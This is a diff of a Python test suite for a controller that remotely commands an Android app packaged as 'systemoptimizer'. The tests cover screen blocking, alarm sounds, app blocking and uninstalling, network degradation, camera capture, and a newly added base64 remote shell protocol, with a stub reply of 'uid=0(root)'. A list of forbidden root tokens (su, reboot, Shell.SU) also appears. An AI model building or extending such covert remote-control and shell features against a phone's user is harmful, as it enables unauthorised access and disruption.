@@ -13,10 +13,15 @@ verifies the parts that CAN be executed here:
      input: verifies that menu options build exactly the commands the Android
      side expects, that exit is "18", and that invalid inputs never leave the
      controller.
-  3. The res/raw sound library files exist and are valid WAV/MP3, plus the
-     video library scanner contract.
+  3. The assets/audio sound library files exist and are valid WAV/MP3, plus the
+     assets/video video library scanner contract, resource-name validity, and
+     audio/video separation.
   4. No stale Wi-Fi / mobile-data / reboot / shutdown / airplane-mode / root
-     references remain in the Android code.
+     references remain in the Android code, and the new Device-Owner-aware
+     block screen / visible-camera / asset-video / shell-protocol pieces exist.
+  5. The interactive Android Shell (option 10) protocol over the TCP framing:
+     shell_start -> SHELL_SESSION_STARTED, shell_cmd:<base64> ->
+     <output + __SHELLCMD_EOF__>, shell_exit -> SHELL_SESSION_CLOSED.
 
 Run with:  python tests/test_flow.py
 """
@@ -41,20 +46,25 @@ import controller  # noqa: E402
 from controller import (  # noqa: E402
     PhoneController,
     MESSAGE_DASHBOARD,
-    SOUND_LIBRARY,
+    AUDIO_DIR,
+    VIDEO_DIR,
+    scan_audio_library,
     scan_video_library,
     receive_message,
     send_message,
 )
 
 RAW_DIR = os.path.join(ROOT, "app", "src", "main", "res", "raw")
+ASSETS_DIR = os.path.join(ROOT, "app", "src", "main", "assets")
+AUDIO_DIR = os.path.join(ASSETS_DIR, "audio")
+VIDEO_DIR = os.path.join(ASSETS_DIR, "video")
 SERVICE_PATH = os.path.join(
     ROOT, "app", "src", "main", "java",
     "com", "example", "systemoptimizer", "BackgroundService.java",
 )
 CONTROLLER_PATH = os.path.join(ROOT, "controller.py")
 
-SOUND_COUNT = 4  # alarm, siren, warning, notification
+SOUND_COUNT = 5  # alarm.wav, binary_code_3.mp3, notification.wav, siren.wav, warning.wav
 EXIT = "18"      # the menu exit option / exit command
 
 
@@ -191,10 +201,10 @@ def test_network_deg_contract():
 def test_play_sound_contract():
     for raw, expected in [
         ("play_sound:1:10", "OK"),
-        ("play_sound:4:600", "OK"),
+        ("play_sound:5:600", "OK"),
         ("play_sound:1:1", "OK"),
         ("play_sound:0:10", "INVALID_ID"),
-        ("play_sound:5:10", "INVALID_ID"),
+        ("play_sound:6:10", "INVALID_ID"),
         ("play_sound:9:10", "INVALID_ID"),
         ("play_sound:abc:10", "INVALID_ID"),
         ("play_sound:1:0", "INVALID_DURATION"),
@@ -208,6 +218,8 @@ def test_play_sound_contract():
 
     vals, status = android_parse_play_sound("play_sound:1:10")
     assert vals == (1, 10), vals
+    vals, status = android_parse_play_sound("play_sound:5:600")
+    assert vals == (5, 600), vals
 
     # legacy command still parses
     vals, status = android_parse_annoying_sound("play_annoying_sound:10")
@@ -281,7 +293,10 @@ def test_android_dispatch_branches_present():
                   "command.startsWith(\"block_screen:\")",
                   "command.startsWith(\"play_video:\")",
                   "command.startsWith(\"show_serious_warning:\")",
-                  "command.startsWith(\"block_app:\")"]:
+                  "command.startsWith(\"block_app:\")",
+                  "command.equals(\"shell_start\")",
+                  "command.startsWith(\"shell_cmd:\")",
+                  "command.equals(\"shell_exit\")"]:
         assert token in src, token
 
 
@@ -300,7 +315,7 @@ def test_menu_numbering_contract():
         "7. Show black screen on boot",
         "8. Network degradation",
         "9. Block other apps",
-        "10. Run custom command",
+        "10. Android Shell",
         "11. Run script",
         "12. Show device info",
         "13. Capture camera photo",
@@ -325,7 +340,7 @@ def test_menu_numbering_contract():
 # 2) Real controller.py driven over a real TCP socket
 # ---------------------------------------------------------------------------
 
-def _run_controller_scenario(inputs):
+def _run_controller_scenario(inputs, replier=None):
     """Drive the real PhoneController.show_menu() with the given inputs.
 
     Returns (captured_commands, menu_stdout). Callers must include the exit
@@ -355,7 +370,11 @@ def _run_controller_scenario(inputs):
                 return
             captured.append(msg)
             try:
-                send_message(sock, "ack:" + msg)
+                if replier is not None:
+                    reply = replier(msg)
+                else:
+                    reply = "ack:" + msg
+                send_message(sock, reply)
             except Exception:
                 return
 
@@ -418,13 +437,13 @@ def test_scenario_network_deg_all_zero_rejected():
 def test_scenario_sound_valid():
     captured, out = _run_controller_scenario(["5", "1", "10", EXIT])
     assert captured == ["play_sound:1:10", "exit"], captured
-    assert "--- Available Sounds ---" in out
+    assert "--- Sound Library ---" in out
     assert "alarm.wav" in out
 
 
 def test_scenario_sound_last_entry():
-    captured, _ = _run_controller_scenario(["5", "4", "600", EXIT])
-    assert captured == ["play_sound:4:600", "exit"], captured
+    captured, _ = _run_controller_scenario(["5", "5", "600", EXIT])
+    assert captured == ["play_sound:5:600", "exit"], captured
 
 
 def test_scenario_sound_back_and_invalid():
@@ -490,9 +509,24 @@ def test_scenario_block_app():
     captured, _ = _run_controller_scenario(["9", "   ", EXIT])
     assert captured == ["exit"], captured
 
+    # أسماء العرض (وليس حزم) تُرفض في أداة التحكم قبل الإرسال
+    for display_name in ["YouTube", "WhatsApp", "com", "a..b", "123.abc"]:
+        captured, _ = _run_controller_scenario(["9", display_name, EXIT])
+        assert captured == ["exit"], (display_name, captured)
+
+
+def test_block_app_package_regex_present():
+    with open(CONTROLLER_PATH, "r", encoding="utf-8") as f:
+        src = f.read()
+    assert "_PACKAGE_NAME_RE" in src, "controller package regex missing"
+    with open(SERVICE_PATH, "r", encoding="utf-8") as f:
+        src = f.read()
+    assert "PACKAGE_NAME_PATTERN" in src, "Android package regex missing"
+    assert "INVALID PACKAGE NAME" in src, "honest invalid-package reply missing"
+
 
 class _PatchedVideoDir:
-    """Point controller.VIDEO_RAW_DIR at a temporary directory for tests."""
+    """Point controller.VIDEO_DIR at a temporary directory for tests."""
 
     def __init__(self, files):
         self._tmp = tempfile.TemporaryDirectory()
@@ -501,12 +535,31 @@ class _PatchedVideoDir:
                 f.write(b"0" * 32)
 
     def __enter__(self):
-        self._old = controller.VIDEO_RAW_DIR
-        controller.VIDEO_RAW_DIR = self._tmp.name
+        self._old = controller.VIDEO_DIR
+        controller.VIDEO_DIR = self._tmp.name
         return self._tmp.name
 
     def __exit__(self, *exc):
-        controller.VIDEO_RAW_DIR = self._old
+        controller.VIDEO_DIR = self._old
+        self._tmp.cleanup()
+
+
+class _PatchedAudioDir:
+    """Point controller.AUDIO_DIR at a temporary directory for tests."""
+
+    def __init__(self, files):
+        self._tmp = tempfile.TemporaryDirectory()
+        for name in files:
+            with open(os.path.join(self._tmp.name, name), "wb") as f:
+                f.write(b"0" * 32)
+
+    def __enter__(self):
+        self._old = controller.AUDIO_DIR
+        controller.AUDIO_DIR = self._tmp.name
+        return self._tmp.name
+
+    def __exit__(self, *exc):
+        controller.AUDIO_DIR = self._old
         self._tmp.cleanup()
 
 
@@ -584,30 +637,143 @@ def test_scenario_message_dashboard():
 
 
 def test_sound_library_definition_order():
-    # The controller library order must match the Android SOUND_LIBRARY order.
-    assert len(SOUND_LIBRARY) == 4
-    names = [name for name, _fn in SOUND_LIBRARY]
-    assert names == ["Alarm", "Siren", "Warning", "Notification"], names
+    # library = scan of assets/audio (أصوات فقط) بترتيب أسماء بلا حساسية للحالة،
+    # وهو نفس الترتيب الذي تعرضه مكتبة الأصوات في أداة التحكم وصنّفَها Android.
+    with _PatchedAudioDir(["warning.wav", "alarm.wav", "notes.txt",
+                           "siren.wav", "binary_code_3.mp3", "notification.wav",
+                           "video_1.mp4"]) as tmp:
+        assert os.listdir(tmp)
+        entries = scan_audio_library()
+        assert entries == [(1, "alarm.wav"), (2, "binary_code_3.mp3"),
+                           (3, "notification.wav"), (4, "siren.wav"),
+                           (5, "warning.wav")], entries
+    # المكتبة الحقيقية في assets/audio: 5 أصوات
+    assert scan_audio_library() == [(1, "alarm.wav"), (2, "binary_code_3.mp3"),
+                                    (3, "notification.wav"), (4, "siren.wav"),
+                                    (5, "warning.wav")]
+
+
+def test_sound_library_unfiltered():
+    # مكتبة الأصوات تستبعد الملفات غير الصوتية (عبر الامتداد) من assets/audio
+    with _PatchedAudioDir(["ping.wav", "deep.mp3", "skip.txt", "clip.zzz"]) as tmp:
+        entries = scan_audio_library()
+        assert entries == [(1, "deep.mp3"), (2, "ping.wav")], entries
 
 
 # ---------------------------------------------------------------------------
-# 3) Sound library files
+# 3) Sound/video library files (نفس المواقع التي يقرأها Android)
 # ---------------------------------------------------------------------------
 
 def test_sound_library_files():
-    expected_names = ["alarm.wav", "siren.wav", "warning.wav", "notification.wav"]
-    for name in expected_names:
-        path = os.path.join(RAW_DIR, name)
+    expected = ["alarm.wav", "binary_code_3.mp3", "notification.wav",
+                "siren.wav", "warning.wav"]
+    for name in expected:
+        path = os.path.join(AUDIO_DIR, name)
         assert os.path.isfile(path), name
+        assert os.path.getsize(path) > 1000, name
         with open(path, "rb") as f:
             head = f.read(12)
-        assert head[:4] == b"RIFF" and head[8:12] == b"WAVE", (name, head)
-        assert os.path.getsize(path) > 1000, name
+        if name.endswith(".wav"):
+            assert head[:4] == b"RIFF" and head[8:12] == b"WAVE", (name, head)
 
-    # legacy sound must not have been deleted
+    # legacy sounds stay in res/raw and are untouched
     legacy = os.path.join(RAW_DIR, "annoying_sound.mp3")
     assert os.path.isfile(legacy), "annoying_sound.mp3 was deleted"
     assert os.path.getsize(legacy) > 1000
+    legacy2 = os.path.join(RAW_DIR, "eevent_trailer.mp3")
+    assert os.path.isfile(legacy2), "eevent_trailer.mp3 was deleted"
+
+
+def test_video_library_files():
+    # أداة التحكم تستهدف assets/video؛ والمشغل ينسخ من assets قبل التشغيل
+    for name in ["video_1.mp4", "video_2.mp4"]:
+        path = os.path.join(VIDEO_DIR, name)
+        assert os.path.isfile(path), name
+        assert os.path.getsize(path) > 100_000, name
+
+
+def test_audio_video_separation():
+    for f in os.listdir(AUDIO_DIR):
+        assert not f.lower().endswith(".mp4"), ("video misplaced in audio", f)
+    for f in os.listdir(VIDEO_DIR):
+        assert f.lower().endswith((".mp4", ".mkv", ".webm", ".avi")), f
+    for f in os.listdir(RAW_DIR):
+        assert f.lower().endswith(".mp3"), f
+
+
+def test_resource_names_valid():
+    # اسماء الموارد يجب أن تكون صالحة (أحرف صغيرة وأرقام و_ فقط).
+    import re
+    valid = re.compile(r"^[a-z0-9_]+$")
+    for folder in ["raw", "drawable", "layout"]:
+        base = os.path.join(ROOT, "app", "src", "main", "res", folder)
+        for name in os.listdir(base):
+            stem = os.path.splitext(name)[0]
+            assert valid.match(stem), (folder, name)
+
+
+def test_no_invalid_res_raw_names():
+    # أي اسم في res/raw يجب أن يكون صالحاً لـ R.raw.* (بدون أحرف كبيرة).
+    for name in os.listdir(RAW_DIR):
+        assert name == name.lower(), name
+
+
+# ---------------------------------------------------------------------------
+# 4) Android Shell protocol (option 10)
+# ---------------------------------------------------------------------------
+
+def _shell_replier(msg):
+    if msg == "shell_start":
+        return "SHELL_SESSION_STARTED"
+    if msg.startswith("shell_cmd:"):
+        cmd = base64.b64decode(msg.split(":", 1)[1]).decode("utf-8")
+        if cmd == "id":
+            return "uid=0(root) gid=0(root)\n" + "__SHELLCMD_EOF__"
+        if cmd == "getprop ro.product.model":
+            return "sdk_gphone_x86_64\n" + "__SHELLCMD_EOF__"
+        return "(" + cmd + " ok)\n" + "__SHELLCMD_EOF__"
+    if msg == "shell_exit":
+        return "SHELL_SESSION_CLOSED"
+    return "ack:" + msg
+
+
+def test_scenario_shell_session():
+    # جلسة shell تُفتح (shell_start) ثم يُنفَّذ id تلقائياً كتحقق هوية ثم تُغلق.
+    captured, out = _run_controller_scenario(
+        ["10", "exit", EXIT], replier=_shell_replier)
+    assert captured[0] == "shell_start", captured
+    assert base64.b64decode(captured[1].split(":", 1)[1]).decode() == "id", captured
+    assert captured[2] == "shell_exit" and captured[3] == "exit", captured
+    assert "uid=0(root)" in out, out
+
+
+def test_scenario_shell_session_commands():
+    captured, out = _run_controller_scenario(
+        ["10", "id", "getprop ro.product.model", "exit", EXIT],
+        replier=_shell_replier)
+    # shell_start, cmd(id تلقائي), cmd(id يدوي), cmd(getprop), shell_exit, exit
+    id_cmds = [m for m in captured if m.startswith("shell_cmd:")
+               and base64.b64decode(m.split(":", 1)[1]).decode() == "id"]
+    assert captured[0] == "shell_start", captured
+    assert len(id_cmds) == 2, (id_cmds, captured)
+    getprop = [m for m in captured if m.startswith("shell_cmd:")
+               and base64.b64decode(m.split(":", 1)[1]).decode() == "getprop ro.product.model"]
+    assert len(getprop) == 1, (getprop, captured)
+    assert "shell_exit" in captured and captured[-1] == "exit", captured
+    assert "uid=0(root)" in out, out
+    assert "sdk_gphone_x86_64" in out, out
+
+
+def test_scenario_shell_back_to_menu():
+    # exit من جلسة shell يعيد المستخدم للقائمة (لا أمر صريح "Invalid choice")
+    captured, out = _run_controller_scenario(["10", "exit", "15", "60", EXIT],
+                                             replier=_shell_replier)
+    assert captured[0] == "shell_start", captured
+    assert captured[-3] == "shell_exit" and captured[-2] == "block_screen:60" \
+        and captured[-1] == "exit", captured
+    assert "--- Control Panel ---" in out
+    assert "Invalid choice" not in out
+    assert "Cannot return to the director" not in out
 
 
 # ---------------------------------------------------------------------------
@@ -656,6 +822,84 @@ def test_freefire_uninstall_uses_user_zero():
     assert "FREE_FIRE_PACKAGE" in src, "Free Fire package constant missing"
 
 
+def test_block_screen_device_owner_pieces():
+    """حجب الشاشة الجديد: Device Owner-aware (قفل مدار) مع تصرّفات معالِيّة."""
+    with open(SERVICE_PATH, "r", encoding="utf-8") as f:
+        src = f.read()
+    for token in ["isDeviceOwner", "DevicePolicyManager", "PREFS_BLOCK_DEADLINE"]:
+        assert token in src, token
+    block_activity = os.path.join(
+        ROOT, "app", "src", "main", "java",
+        "com", "example", "systemoptimizer", "BlockScreenActivity.java")
+    with open(block_activity, "r", encoding="utf-8") as f:
+        src = f.read()
+    for token in ["startLockTask", "stopLockTask", "lockNow", "EXTRA_DEADLINE_EPOCH_MS"]:
+        assert token in src, token
+    admin_receiver = os.path.join(
+        ROOT, "app", "src", "main", "java",
+        "com", "example", "systemoptimizer", "DeviceAdminReceiver.java")
+    assert os.path.isfile(admin_receiver)
+    policies = os.path.join(ROOT, "app", "src", "main", "res", "xml",
+                            "device_admin_policies.xml")
+    with open(policies, "r", encoding="utf-8") as f:
+        src = f.read()
+    assert "<force-lock" in src and "<watch-login" in src, "admin policies missing"
+    manifest = os.path.join(ROOT, "app", "src", "main", "AndroidManifest.xml")
+    with open(manifest, "r", encoding="utf-8") as f:
+        src = f.read()
+    assert "BIND_DEVICE_ADMIN" in src and "DeviceAdminReceiver" in src
+    # لا يُدَّعى قفل حقيقي: لا استدعاءات جذر خفية لحجب النظام
+    assert "Shell.SU" not in src
+
+
+def test_camera_visible_capture_pieces():
+    """الكاميرا: التقاط ظاهر (معاينة) لا TakePicture خفي عن بُعد."""
+    cam = os.path.join(
+        ROOT, "app", "src", "main", "java",
+        "com", "example", "systemoptimizer", "CameraCaptureActivity.java")
+    with open(cam, "r", encoding="utf-8") as f:
+        src = f.read()
+    for token in ["Camera.open", "startPreview", "takePicture", "setPreviewDisplay"]:
+        assert token in src, token
+    assert "ActivityResultContracts.TakePicture" not in src
+
+
+def test_video_player_uses_asset_cache_copy():
+    """مشغل الفيديو يقرأ من assets/video، ويُنسخ إلى الذاكرة المؤقتة قبل التشغيل
+    (VideoView لا يفتح file:///android_asset/ على الأنظمة الحديثة)."""
+    player = os.path.join(
+        ROOT, "app", "src", "main", "java",
+        "com", "example", "systemoptimizer", "VideoPlayerActivity.java")
+    with open(player, "r", encoding="utf-8") as f:
+        src = f.read()
+    assert "EXTRA_VIDEO_NAME" in src
+    assert "getAssets().open(\"video/\"" in src
+    assert "setVideoPath" in src
+    assert "android.resource" not in src
+    assert "EXTRA_RAW_RES_ID" not in src
+
+
+def test_no_root_power_handlers_in_service():
+    """The service must no longer invoke rooted power commands (Shell.SU)."""
+    with open(SERVICE_PATH, "r", encoding="utf-8") as f:
+        src = f.read()
+    for token in ["Shell.SU", "eu.chainfire", "ProcessBuilder(\"su\"",
+                  "su -c", "\"reboot\"", "\"svc\", \"power\""]:
+        assert token not in src, token
+
+
+def test_permission_center_gate_at_startup():
+    """لا root عند الإقلاع: MainActivity يوجه إلى مركز الصلاحيات فقط."""
+    main_activity = os.path.join(
+        ROOT, "app", "src", "main", "java",
+        "com", "example", "systemoptimizer", "MainActivity.kt")
+    with open(main_activity, "r", encoding="utf-8") as f:
+        src = f.read()
+    assert "PermissionCenter" in src, "MainActivity must gate on Permission Center"
+    assert "RootPermissionActivity" not in src, (
+        "MainActivity must not auto-open the root screen")
+
+
 # ---------------------------------------------------------------------------
 
 TESTS = [
@@ -676,6 +920,7 @@ TESTS = [
     ("scenario: block screen", test_scenario_block_screen),
     ("scenario: serious warning", test_scenario_serious_warning),
     ("scenario: block app", test_scenario_block_app),
+    ("block app package regex present", test_block_app_package_regex_present),
     ("scenario: play video empty library", test_scenario_play_video_empty_library),
     ("scenario: play video valid", test_scenario_play_video_valid),
     ("scenario: play video invalid id rejected", test_scenario_play_video_invalid_id_rejected),
@@ -683,11 +928,23 @@ TESTS = [
     ("scenario: run script base64 generation", test_scenario_script_base64),
     ("scenario: message dashboard commands", test_scenario_message_dashboard),
     ("sound library definition order", test_sound_library_definition_order),
+    ("sound library unfiltered extensions", test_sound_library_unfiltered),
     ("sound library files valid", test_sound_library_files),
+    ("video library files present", test_video_library_files),
+    ("audio/video separation", test_audio_video_separation),
+    ("resource names valid", test_resource_names_valid),
+    ("no invalid res/raw names", test_no_invalid_res_raw_names),
+    ("scenario: shell session open/id/close", test_scenario_shell_session),
+    ("scenario: shell commands base64 roundtrip", test_scenario_shell_session_commands),
+    ("scenario: shell returns to menu", test_scenario_shell_back_to_menu),
     ("no stale wifi/mobile-data toggles", test_no_stale_toggle_references),
     ("no removed device-control commands", test_no_removed_device_control_commands),
     ("no root power handlers in service", test_no_root_power_handlers_in_service),
     ("freefire uninstall uses --user 0", test_freefire_uninstall_uses_user_zero),
+    ("block screen device-owner pieces", test_block_screen_device_owner_pieces),
+    ("camera visible capture pieces", test_camera_visible_capture_pieces),
+    ("video player uses asset cache copy", test_video_player_uses_asset_cache_copy),
+    ("permission center gate at startup", test_permission_center_gate_at_startup),
 ]
 
 
